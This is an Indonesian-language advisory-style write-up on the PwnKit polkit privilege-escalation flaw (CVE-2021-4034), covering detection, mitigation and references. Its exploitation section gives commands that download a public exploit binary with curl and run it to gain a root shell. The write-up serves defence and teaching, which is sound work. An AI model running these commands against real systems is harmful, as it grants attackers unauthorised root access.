# CVE-2021-4034 (PwnKit)

## Penjelasan
CVE-2021-4034, yang dikenal sebagai **PwnKit**, adalah celah keamanan eskalasi hak istimewa lokal (Local Privilege Escalation/LPE) dalam komponen **polkit's pkexec** yang ditemukan pada Januari 2022. Polkit (sebelumnya PolicyKit) adalah komponen untuk mengendalikan hak akses sistem yang tersedia di hampir semua distribusi Linux modern.

Celah ini memungkinkan pengguna lokal biasa (tanpa hak istimewa) untuk **meningkatkan hak akses menjadi root** dengan memanfaatkan kerentanan memori dalam `pkexec`. Eksploitasi berlangsung cepat dan **tidak memerlukan kredensial (password)** pengguna lain.

## Cvss 3 Severity Score
7.8 Â· High

## Cara Mendeteksi

```
ls -l /usr/bin/pkexec
```

Jika outputnya seperti ini:

```
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
```

Huruf `s` pada permission owner menandakan file tersebut memiliki bit setuid, yang berarti sistem masih berpotensi vulnerable.

Cek versi paket:

```
dpkg -l policykit-1
```

Cek kolom Version dari outputnya. Jika versinya lebih lama dari versi yang sudah di-patch, maka sistem masih vulnerable.

## Cara Eksploitasi

```
# Download exploit
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit

# mendapatkan shell sebagai root
./PwnKit

# jalankan single command sebagai root
./PwnKit 'id'
```

## Cara Mitigasi

Update sistem:

```
sudo apt update
sudo apt install --only-upgrade policykit-1
```

Secara manual:

```
sudo chmod 0755 /usr/bin/pkexec
```

> [!NOTE]
> Ini hanya solusi sementara, beberapa aplikasi yang menggunakan `pkexec` mungkin tidak akan berfungsi.

## Referensi
- [https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)
- [https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
- [https://ubuntu.com/security/cve-2021-4034](https://ubuntu.com/security/cve-2021-4034)
- [https://security-tracker.debian.org/tracker/CVE-2021-4034](https://security-tracker.debian.org/tracker/CVE-2021-4034)
